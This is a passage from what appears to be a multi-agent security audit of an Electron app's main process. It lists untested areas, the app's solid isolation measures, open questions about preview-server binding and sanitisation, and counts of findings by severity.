  - No test for `file:rename` collision/overwrite behaviour (MAIN-08).
  - No test asserts the preload is absent from sub-frames / webviews (the security-critical invariant) — it holds by Electron default, but a regression (someone setting `nodeIntegrationInSubFrames` or adding a webview `preload`) would be caught by nothing.
  - Per the project's own caveat, unit tests **stub host primitives**, so the real `files.js`/`shell.js`/`gnuplot.js` handler bodies are not executed under `pnpm test`; their behaviour is only validated live. Security-relevant handler bodies (path handling, `shell:true`) are therefore untested in CI.

---

## What's solid

- Context isolation on, nodeIntegration off, webview guests with no preload — the classic Electron footguns are avoided at the window level.
- Preload exposes an explicit, enumerable API; no `ipcRenderer`/`require`/`fs` leakage, no dynamic channel names.
- **Verified:** hostile iframe/webview/preview content cannot reach `window.host` (preload not loaded in sub-frames without `nodeIntegrationInSubFrames`; webview has no preload; popout uses a minimal bridge).
- `process:run` deliberately avoids `shell:true`; argv is stringified verbatim.
- Atomic writes for all user-data files; external-change conflict guard on save.
- `__host__` serve route confined by a realpath-resolved allowlist with correct `root/`-boundary checks; `app://`/`docs` base-directory traversal is blocked (`serve.js:146`, `files.js:974`).
- Subprocess lifecycle (shell/gnuplot/jmarkdown-watch) reaped on window close and app quit; HTTP-200 readiness probe (not bare TCP) for the preview server.
- `bdsk:open` guards against launching apps/directories.
- main-process `uncaughtException`/`unhandledRejection` handlers keep the host alive; boot-guard gives a recoverable overlay on renderer boot failure.

---

## Open questions

1. **Does `jmarkdown watch` bind `127.0.0.1` or `0.0.0.0`?** `freePort` probes on `127.0.0.1` and the iframe loads `http://localhost:PORT`, but the actual bind interface is jmarkdown's (out of this tree). If it binds `0.0.0.0`, a previewed (possibly hostile) document is readable from the LAN for the life of the watcher. (agent 2/3 or the jmarkdown package.)
2. **Is the sticky-note / docstring render path ever pointed at a sanitising renderer in any configuration?** I traced `marked` (unsanitised) and the `host.renderJMarkdown` shell-out; both emit raw HTML. Confirm there is no third path that escapes. (Confirms MAIN-01 has no accidental mitigation.)
3. **Does the renderer's directory-tree Rename pre-check reliably prevent the `file:rename` overwrite (MAIN-08) for all entry kinds, and is it race-free?** (agent 12 owns the UI; the main handler is unsafe alone regardless.)
4. **What does the server actually do when it receives a crafted file it can't parse — crash, or contain it?** MAIN-15 is about the main-side non-handling of a crash; the crash *trigger* surface is server territory (agent 2/3).
5. **Is `writeMetadataSync` (audio tags) fsync-durable enough for large media files**, or should it move to the shared `atomicWrite` (which fsyncs before rename)? Minor.

---

## Stats

- Findings: **1 P0, 0 P1, 9 P2, 4 P3** (14 total).
- By dimension: security 9 (MAIN-01,-02,-03,-04,-06,-07,-09,-11,-14), data-safety/correctness 5 (MAIN-05,-08,-12,-15 + MAIN-04 overlap).
- IPC handlers audited: **69** `ipcMain.handle/on` across 6 main-process files; `host.*` bridge methods: ~70.
- BrowserWindows: editor (full preload), popout (minimal preload) — webPreferences reviewed for both; webview attributes reviewed (`browser-view.js`).
- Confirmed isolation invariant: preload not loaded in sub-frames (Electron 42 `electron.d.ts`), webview guests preload-less.
- Lines of main-process code read in full: ~4,400 (target files) + targeted renderer excerpts.
